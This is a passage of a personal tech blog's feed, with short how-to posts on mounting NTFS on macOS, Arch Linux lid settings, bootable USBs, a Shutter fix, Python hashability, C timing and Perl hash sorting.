After I plugged it into my MacBook Air 2013 USB port,&lt;br /&gt;
I didn't see it show up in the sidebar of the finder.&lt;br /&gt;
So I searching the web to find the solution.  &lt;/p&gt;
&lt;p&gt;I find two existed softwares to help Mac user using the NTFS disk:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.paragon-software.com/home/ntfs-mac/"&gt;Paragon NTFS&lt;/a&gt;&lt;br /&gt;
    After I installed it, it just can't read my NTFS external hard drive.&lt;br /&gt;
    (The disk select list of Paragon NTFS is empty)  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.tuxera.com/products/tuxera-ntfs-for-mac/"&gt;Tuxera NTFS&lt;/a&gt;&lt;br /&gt;
    I didn't try it. After I saw it only have 15 days trial version, I just skipped it.  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Here are the tips to mount the Windows NTFS filesystem on Mac OSX using command line:  &lt;/p&gt;
&lt;!--more--&gt;

&lt;h1&gt;1. Install ntfs-3g&lt;/h1&gt;
&lt;p&gt;I installed it by using homebrew. If you already installed homebrew as well,&lt;br /&gt;
just type &lt;code&gt;brew install ntfs-3g&lt;/code&gt;&lt;br /&gt;
or you can get the source code of ntfs-3g &lt;a href="http://macntfs-3g.blogspot.tw/"&gt;here&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;2. Load the fuse4x kernel extension&lt;/h1&gt;
&lt;p&gt;After installed ntfs-3g, you neet to load the fuse4x-kext or ntfs-3g will not work.&lt;br /&gt;
follow the instructions given by &lt;code&gt;brew info fuse4x-kext&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo /bin/cp -rfX /usr/local/Cellar/fuse4x-kext/0.9.2/Library/Extensions/fuse4x.kext /Library/Extensions&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo chmod +s /Library/Extensions/fuse4x.kext/Support/load_fuse4x&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;3. Check &amp;amp; Mount NTFS&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;diskutil list&lt;/code&gt; to see the identifier of your NTFS disk. &lt;strong&gt;(for me, it's /dev/disk1s1 here.)&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;diskutil unmount /dev/disk1s1&lt;/code&gt; &lt;strong&gt;(to make sure that the volume is unmounted)&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo mkdir /Volumes/NTFS&lt;/code&gt; &lt;strong&gt;(/Volumes/NTFS could be change to anywhere you want to mount your NTFS)&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo ntfs-3g /dev/disk1s1 /Volumes/NTFS&lt;/code&gt;&lt;br /&gt;
You can go to check the /Volumes/NTFS if the NTFS is mounted succefully or not.  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Unsolved Problem:&lt;br /&gt;
All I could see in my NTFS filesystem are directories.&lt;br /&gt;
All the files in the directories can't be seen in the finder with gui mode.&lt;br /&gt;
So, I just use iTerm2 to cd into the directory, then&lt;br /&gt;
&lt;code&gt;open x.pdf&lt;/code&gt; to open the file with default application.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/mxcl/homebrew/issues/13647"&gt;fuse4x installs properly but kext doesn't get loaded (10.8)&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://blog.taylormcgann.com/2012/07/19/mount-ntfs-drives-on-mac/"&gt;Mount NTFS Drives on Mac&lt;/a&gt;  &lt;/p&gt;</summary><category term="OS X"></category><category term="Mac"></category><category term="Windows"></category><category term="NTFS"></category></entry><entry><title>Disable auto suspend while the laptop lid close in Arch Linux</title><link href="https://blog.m157q.tw/posts/2013/10/15/disable-auto-suspend-while-the-laptop-lid-close-in-arch-linux/" rel="alternate"></link><published>2015-10-27T21:24:00+08:00</published><updated>2015-10-27T21:24:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-10-15:posts/2013/10/15/disable-auto-suspend-while-the-laptop-lid-close-in-arch-linux/</id><summary type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Use editor to modify the configuration file of the systemd-logind&lt;br /&gt;
&lt;code&gt;# vim /etc/systemd/logind.conf&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find&lt;br /&gt;
&lt;code&gt;#HandleLidSwitch=suspend&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Uncommnet it and then change it to&lt;br /&gt;
&lt;code&gt;HandleLidSwitch=ignore&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;After saving the modification, we need to restart the systemd-logind&lt;br /&gt;
&lt;code&gt;# systemctl restart systemd-logind&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now the change should be effective now.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://unix.stackexchange.com/questions/52643/how-to-disable-auto-suspend-when-i-close-laptop-lid"&gt;How to disable auto suspend when I close laptop lid?&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="Laptop"></category><category term="systemd"></category></entry><entry><title>How to Create a Bootable USB on Mac OS</title><link href="https://blog.m157q.tw/posts/2013/10/14/how-to-create-a-bootable-usb-on-mac-os/" rel="alternate"></link><published>2013-10-14T11:28:00+08:00</published><updated>2013-10-14T11:28:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-10-14:posts/2013/10/14/how-to-create-a-bootable-usb-on-mac-os/</id><summary type="html">&lt;p&gt;Using Macbook Air 2013 with OSX 10.8.5  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Applications -&amp;gt; Utilities -&amp;gt; Boot Camp Assistant -&amp;gt; continue&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;check the &lt;code&gt;"Create a Windows7 install disk"&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;you need to prepare a usb disk and a Windows7 iso file  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;2013/10/14 failed for making a Windows7 bootable usb disk using the method below  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Convert a iso file into a img file:&lt;br /&gt;
&lt;code&gt;hdiutil convert -format UDRW -o $[name].dmg $[name].iso&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List the disk storage information:&lt;br /&gt;
&lt;code&gt;diskutil list&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You should see the usb disk is one of the /dev/disk?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Unmount the usb disk for writing the img file into the usb:&lt;br /&gt;
&lt;code&gt;diskutil umountDisk /dev/disk?&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use dd command to write the img file into the ubs disk:&lt;br /&gt;
&lt;code&gt;sudo dd -if=$[name].dmg -of=/dev/disk? bs=1m&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If your dd command is GNU version, use:&lt;br /&gt;
&lt;code&gt;sudo dd -if=$[name].dmg -of=/dev/disk? bs=1M&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;After the dd command is completed, eject the usb disk:&lt;br /&gt;
&lt;code&gt;diskutil eject /dev/disk?&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Reference&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://sealmemory.blogspot.tw/2013/05/create-a-usb-stick-on-mac-osx.html"&gt;http://sealmemory.blogspot.tw/2013/05/create-a-usb-stick-on-mac-osx.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="OS X"></category><category term="Mac"></category><category term="USB"></category><category term="Bootable USB"></category></entry><entry><title>Can't edit pictures while using Shutter</title><link href="https://blog.m157q.tw/posts/2013/06/08/cant-edit-pictures-while-using-shutter/" rel="alternate"></link><published>2017-09-15T17:55:00+08:00</published><updated>2017-09-15T17:55:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-06-08:posts/2013/06/08/cant-edit-pictures-while-using-shutter/</id><summary type="html">&lt;p&gt;After upgraded my Arch Linux, I just can't edit photos with Shutter while the function of taking screenshots is ok.  &lt;/p&gt;
&lt;p&gt;So, I googled for "shutter can't edit archlinux" and found &lt;a href="http://shutter-project.org/downloads/dependencies/"&gt;this article&lt;/a&gt;.&lt;br /&gt;
The function of editing pics depends on libgoo-canvas-perl  &lt;/p&gt;
&lt;p&gt;In Arch Linux, we just need to type this in terminal  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ yaourt -S libgoo-canvas-perl&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;to install the package from AUR.  &lt;/p&gt;
&lt;p&gt;Then the function of editing pics works fine.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Reference&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://shutter-project.org/downloads/dependencies/"&gt;Dependencies | Shutter - Feature-rich Screenshot Tool&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="shutter"></category><category term="perl"></category></entry><entry><title>[Python] Mutable v.s Hashable</title><link href="https://blog.m157q.tw/posts/2013/06/05/python-mutable-vs-hashable/" rel="alternate"></link><published>2013-06-05T09:31:00+08:00</published><updated>2013-06-05T09:31:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-06-05:posts/2013/06/05/python-mutable-vs-hashable/</id><summary type="html">&lt;p&gt;Before talk about this, let's see some definitions.  &lt;/p&gt;
&lt;!--more--&gt;

&lt;p&gt;Mutable Def:&lt;br /&gt;
&lt;a href="http://docs.python.org/3/glossary.html#term-mutable"&gt;Mutable objects can change their value but keep their id().&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Immutable Def:&lt;br /&gt;
&lt;a href="http://docs.python.org/3/glossary.html#term-immutable"&gt;An object with a fixed value. Immutable objects include numbers, strings and&lt;br /&gt;
tuples. Such an object cannot be altered. A new object has to be created if&lt;br /&gt;
a different value has to be stored. They play an important role in places where&lt;br /&gt;
a constant hash value is needed, for example as a key in a dictionary.&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Hashable Def:  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://docs.python.org/3/glossary.html#term-hashable"&gt;An object is &lt;em&gt;hashable&lt;/em&gt; if it has a hash value which never changes during&lt;br /&gt;
its lifetime (it needs a &lt;strong&gt;hash&lt;/strong&gt;()method), and can be compared to other objects&lt;br /&gt;
(it needs an &lt;strong&gt;eq&lt;/strong&gt;() method). Hashable objects which compare equal must have&lt;br /&gt;
the same hash value.&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://docs.python.org/3/glossary.html#term-hashable"&gt;    Hashability makes an object usable as a dictionary key and a set member,&lt;br /&gt;
because these data structures use the hash value internally.&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://docs.python.org/3/glossary.html#term-hashable"&gt;    All of Python’s immutable built-in objects are hashable, while no mutable&lt;br /&gt;
containers (such as lists or dictionaries) are. Objects which are instances&lt;br /&gt;
of user-defined classes are hashable by default; they all compare unequal (except&lt;br /&gt;
with themselves), and their hash value is their id().&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://docs.python.org/3/reference/datamodel.html"&gt;Objects whose value can change are said to be mutable&lt;/a&gt;&lt;a href="http://docs.python.org/3/reference/datamodel.html"&gt;; &lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://docs.python.org/3/reference/datamodel.html"&gt;Objects whose value is unchangeable once they are created are called &lt;em&gt;immutable&lt;/em&gt;. (The value of an immutable container object that contains a reference to  a mutable object can change when the latter’s value is changed; however the  container is still considered immutable, because the collection of objects  it contains cannot be changed. So, immutability is not strictly the same as  having an unchangeable value, it is more subtle.) &lt;/a&gt;&lt;br /&gt;
&lt;a href="http://docs.python.org/3/reference/datamodel.html"&gt;An object’s mutability is determined by its type; for instance, numbers,&lt;br /&gt;
strings and tuples are immutable, while dictionaries, sets and lists are mutable.&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;We can use hash() to check if an object is hashable.  &lt;/p&gt;
&lt;p&gt;But there seems no method to check if an object is mutable or not.  &lt;/p&gt;
&lt;p&gt;Google "python mutable check". Seems many people use hash() to check if an&lt;br /&gt;
object is mutable or not...  &lt;/p&gt;
&lt;p&gt;Python documentation said "&lt;a href="http://docs.python.org/3/glossary.html#term-hashable"&gt;All of Python’s immutable built-in objects are&lt;br /&gt;
hashable, while no mutable containers (such as lists or dictionaries) are.&lt;/a&gt;"  &lt;/p&gt;
&lt;p&gt;So... the questions are:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Is there any hashable built-in object is mutable?  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Is there any un-hashable built-in objects is immutable?  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If the answers of the two questions above is "No".&lt;br /&gt;
Then,   &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Can we create an user defined type that is hashable but mutable?  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Can we create an user defined type that is not hashable but immutable?  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If the answers of the four questions above is "No".  &lt;/p&gt;
&lt;p&gt;Does it mean that we can use hash() to check if an object is mutable or not?  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Refs:&lt;br /&gt;
&lt;a href="http://stackoverflow.com/questions/2671376/hashable-immutable"&gt;http://stackoverflow.com/questions/2671376/hashable-immutable&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://docs.python.org/3/reference/datamodel.html#object.__hash__"&gt;http://docs.python.org/3/reference/datamodel.html#object.&lt;strong&gt;hash&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://docs.python.org/3/tutorial/classes.html"&gt;http://docs.python.org/3/tutorial/classes.html&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://eli.thegreenplace.net/2012/03/30/python-objects-types-classes-and-instances-a-glossary/"&gt;http://eli.thegreenplace.net/2012/03/30/python-objects-types-classes-and-instances-a-glossary/&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://stackoverflow.com/questions/4374006/check-for-mutability-in-python"&gt;http://stackoverflow.com/questions/4374006/check-for-mutability-in-python&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://stackoverflow.com/questions/4418741/im-able-to-use-a-mutable-object-as-a-dictionary-key-in-python-is-this-not-disa"&gt;http://stackoverflow.com/questions/4418741/im-able-to-use-a-mutable-object-as-a-dictionary-key-in-python-is-this-not-disa&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://www.velocityreviews.com/forums/t734950-how-to-test-for-atomicity-mutability-hashability.html"&gt;http://www.velocityreviews.com/forums/t734950-how-to-test-for-atomicity-mutability-hashability.html&lt;/a&gt;  &lt;/p&gt;</summary><category term="Python"></category><category term="Python3"></category><category term="mutable"></category><category term="hashable"></category></entry><entry><title>Estimate program execution time in C</title><link href="https://blog.m157q.tw/posts/2013/05/30/estimate-program-execution-time-in-c/" rel="alternate"></link><published>2015-10-28T13:15:00+08:00</published><updated>2015-10-28T13:15:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-05-30:posts/2013/05/30/estimate-program-execution-time-in-c/</id><summary type="html">&lt;p&gt;Just wanna estimate the process time of my algorithm homework.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Method 1&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/time.h&amp;gt;  &lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;timeval&lt;/span&gt; &lt;span class="n"&gt;t_start&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;t_end&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  

&lt;span class="n"&gt;gettimeofday&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;t_start&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;t_start&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tv_sec&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;t_start&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tv_usec&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;1000000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  

&lt;span class="c1"&gt;// Code to be estimated here  &lt;/span&gt;

&lt;span class="n"&gt;gettimeofday&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;t_end&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;t_end&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tv_sec&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;t_end&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tv_usec&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;1000000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  

&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%f seconds&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This method came from one of my Data Structure homework in last semester.  &lt;/p&gt;
&lt;p&gt;Can estimated even if the process time is less than one second.  &lt;/p&gt;
&lt;p&gt;This is the method which I prefer to use.  &lt;/p&gt;
&lt;p&gt;But, &lt;a href="http://www.cplusplus.com/forum/beginner/22384/"&gt;sys/time.h is a POSIX header, not part of the C/C++ standard library.&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;So, this method can only be implemented on UNIX system.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Method 2&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;time.h&amp;gt;  &lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;clock_t&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;clock&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  

&lt;span class="c1"&gt;//Code to be estimated here  &lt;/span&gt;

&lt;span class="kt"&gt;clock_t&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;clock&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  

&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%f seconds&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;CLOCKS_PER_SEC&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This method seems be common used.  &lt;/p&gt;
&lt;p&gt;But, seems it cannot estimate those process time less than one second.  &lt;/p&gt;
&lt;p&gt;Don't Know why... even if I remove the / (float)CLOCKS_PER_SEC.   &lt;/p&gt;
&lt;p&gt;It still comes out zero. O_o"  &lt;/p&gt;</summary><category term="C"></category><category term="Cpp"></category></entry><entry><title>Sort hash by key or by value in Perl 5.16</title><link href="https://blog.m157q.tw/posts/2013/05/10/sort-hash-by-key-or-by-value-in-perl-5-16/" rel="alternate"></link><published>2015-10-28T15:12:00+08:00</published><updated>2015-10-28T15:12:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-05-10:posts/2013/05/10/sort-hash-by-key-or-by-value-in-perl-5-16/</id><summary type="html">&lt;p&gt;&lt;code&gt;%h = hash, $key = keys in %h&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Sort by key&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# if key is int  &lt;/span&gt;
    &lt;span class="c1"&gt;# ascending  &lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%hash&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $hash{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  

    &lt;span class="c1"&gt;# descending  &lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;reverse&lt;/span&gt; &lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%hash&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $hash{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  

&lt;span class="c1"&gt;# if key is str (represent number)  &lt;/span&gt;
    &lt;span class="c1"&gt;# ascending  &lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="sr"&gt;&amp;lt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $h{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  

    &lt;span class="c1"&gt;# descending  &lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$b&lt;/span&gt; &lt;span class="sr"&gt;&amp;lt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $h{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Sort by value (int)&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# value of %h is int ($h{$key})  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# ascending order  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$hash&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="sr"&gt;&amp;lt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$hash&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;};}&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $h{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  

&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# descending order  &lt;/span&gt;
